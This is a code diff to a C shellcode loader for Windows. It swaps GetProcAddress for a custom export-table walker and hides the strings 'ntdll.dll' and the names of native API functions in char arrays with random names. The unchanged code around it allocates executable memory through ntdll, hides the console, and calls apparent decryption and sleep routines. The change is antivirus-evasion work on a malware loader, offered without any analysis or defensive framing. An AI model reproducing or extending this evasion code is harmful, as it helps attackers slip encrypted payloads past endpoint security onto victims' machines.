@@ -35,9 +35,35 @@ typedef NTSTATUS(WINAPI* PNTPROTECTVIRTUALMEMORY)(
     PULONG OldProtect
 );
 
-static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+// Custom GetProcAddress function
+typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);
 
-static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+FARPROC gettingGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
+        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
+    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
+    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
+
+    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
+        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
+            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
+        }
+    }
+
+    return NULL;
+}
+
+unsigned char eebq[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
+unsigned char zXyv[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char GHIp[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
+
+static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))  gettingGetProcAddress(GetModuleHandle(eebq), zXyv);
+
+static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))  gettingGetProcAddress(GetModuleHandle(eebq), GHIp);
 
 
 
@@ -90,11 +116,11 @@ int Random1(char * difern, unsigned int difern_len, char * key, size_t keylen) {
 
 int main() {
 PNTPROTECTVIRTUALMEMORY NtProtectVirtualMemory =
-        (PNTPROTECTVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+        (PNTPROTECTVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtProtectVirtualMemory");
 
     // Load the NtAllocateVirtualMemory function from ntdll.dll
     PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
-        (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+        (PNTALLOCATEVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtAllocateVirtualMemory");
     FreeConsole();
     // Allocate Virtual Memory  
     void* exec = NULL;
@@ -128,7 +154,7 @@ PNTPROTECTVIRTUALMEMORY NtProtectVirtualMemory =
     Random4(2540);
     // Free the allocated memory using NtFreeVirtualMemory
     PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
-        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
+        (PNTFREEVIRTUALMEMORY) gettingGetProcAddress(GetModuleHandleA(eebq), "NtFreeVirtualMemory");
     SIZE_T regionSize = 0;
     status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);
 
